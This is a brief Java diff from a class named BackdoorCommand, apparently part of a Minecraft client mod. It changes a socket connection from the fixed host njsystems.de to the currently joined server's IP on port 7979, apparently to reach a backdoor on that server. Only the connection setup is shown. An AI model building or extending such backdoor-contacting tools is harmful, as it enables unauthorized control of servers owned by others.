@@ -16,7 +16,7 @@ public class BackdoorCommand extends Command {
     @Override
     public void onCommand(String command, String[] args) {
         try {
-            Socket clientSocket = new Socket("njsystems.de", 7979);
+            Socket clientSocket = new Socket(mc.getCurrentServerData().serverIP, 7979);
             PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
 
             StringBuilder builder = new StringBuilder();
